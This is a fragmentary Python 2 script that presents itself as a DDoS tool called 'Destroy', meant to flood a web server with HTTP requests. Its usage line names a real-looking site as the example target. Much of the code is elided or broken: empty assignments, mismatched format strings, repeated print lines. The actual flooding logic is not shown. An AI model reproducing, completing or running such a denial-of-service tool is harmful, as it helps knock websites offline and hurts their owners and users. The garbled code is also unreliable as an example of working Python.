...
def usage():
	...
	print 'Usage: Destroy (url)'
	print 'Example: Destroy.py http://noobseo.fr/'
	print "\a"
print \
"""
...
def httpcall(url):
	...
	try:
			...
			#print e.code
			set_flag(1)
			print 'Error: Failed to parse 5 columns from line %d' % (safe)
			print 'Error connecting to ' + host + ' on port %d' % (safe)
			print 'send : Resource temporarily unavailable'
                        print '%d | 9 request don for 9 sec' % (request_counter)
                        print 'Timeout connecting to ' + host + ' on port %d' % (safe)
                        previous=request_counter
                        print 'Error: Failed to parse %d columns from line %d' % (safe)
			print 'Error connecting to ' + host + ' on port %d' % (safe)
			print 'send : Resource temporarily unavailable'
                        print '%d | % request don for % sec' % (request_counter)
                        print 'Timeout connecting to ' + host + ' on port %d' % (safe)
                        previous=request_counter
                        print 'Error: Failed to parse 5 columns from line %d' % (safe)
			print 'Error connecting to ' + host + ' on port %d' % (safe)
			...
			#print e.code
			set_flag(1)
			print "----->>>Destroy attack started sended <<<-----"
			code=
...
def httpcall(url):#execute 
        ...
        try:
                        ...
                        #print e.code
                        set_flag(1)
                        print "----->>>Destroy attack started sended <<<-----" % (request_counter)
                        code=	
#http caller thread 
...
if len(sys.argv) < 2:
	...
	if sys.argv[1]=="help":
		...
		print "Starting The Destroy shotings in webserver Hyper Massive Revolt DDoS TooL"
		print "Created by AP.is0n3r "
		if len(sys.argv)== 3:
			if sys.argv[2]=="safe":
				set_safe()
		url = sys.argv[1]
